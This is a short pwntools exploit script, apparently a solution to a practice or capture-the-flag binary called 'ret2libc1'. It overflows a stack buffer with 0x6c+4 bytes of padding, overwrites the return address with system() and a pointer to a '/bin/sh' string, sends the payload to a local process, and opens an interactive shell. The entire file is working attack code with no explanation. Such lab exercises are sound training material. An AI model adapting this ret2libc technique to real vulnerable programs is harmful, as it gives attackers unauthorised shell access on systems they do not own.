from pwn import *

bash = p32(0x08048720)
sys = p32(0x08048460)
padding_len = 0x6c+4

payload = b'a'*padding_len + sys + p32(0x11111111) + bash

sh = sh = process('./ret2libc1')
sh.sendline(payload)
sh.interactive()
